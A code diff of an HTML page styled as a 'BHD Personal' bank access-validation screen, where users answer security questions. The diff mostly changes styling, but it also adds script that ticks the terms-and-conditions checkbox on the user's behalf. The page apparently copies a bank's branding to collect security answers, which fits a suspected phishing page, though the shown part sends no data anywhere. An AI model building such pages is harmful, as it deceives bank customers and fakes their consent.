@@ -25,7 +25,13 @@
         }
         h2 {
             text-align: center;
-            color: #333;
+            font-style: italic; /* Cursiva */
+        }
+        .bhd-personal {
+            color: #51AF46; /* Cambia este color */
+        }
+        .validation-access {
+            color: #869394; /* Cambia este color */
         }
         .security-question {
             margin-bottom: 15px;
@@ -56,16 +62,28 @@
         button:hover {
             background-color: #45a049;
         }
+
+        /* Estilo Responsivo */
+        @media (max-width: 768px) {
+            .container {
+                width: 100%;
+                padding: 15px;
+            }
+            button {
+                width: 100%;
+                padding: 12px;
+            }
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="logo">
         <img src="assets/logo-bhd.svg" alt="BHD Logo" width="100">
-        <h2>BHD Personal</h2>
+        <h2 class="bhd-personal">BHD Personal</h2> <!-- Aquí el color de BHD Personal -->
     </div>
 
-    <h2>Validación de acceso</h2>
+    <h2 class="validation-access">Validación de acceso</h2> <!-- Aquí el color de Validación de acceso -->
     <p>Responde correctamente las preguntas de seguridad que configuraste para acceder a tus productos.</p>
 
     <form id="security-form">
@@ -95,7 +113,7 @@
         </div>
 
         <div class="security-question">
-            <input type="checkbox" required>
+            <input type="checkbox" id="terms-checkbox" required>
             Acepto los términos y condiciones
         </div>
 
@@ -109,6 +127,9 @@
 <script>
     document.getElementById('security-form').addEventListener('submit', function(event) {
         event.preventDefault();
+
+        // Marcar automáticamente la casilla de términos y condiciones
+        document.getElementById('terms-checkbox').checked = true;
 
         const favoriteCharacter = document.getElementById('favorite-character').value;
         const firstCarBrand = document.getElementById('first-car-brand').value;
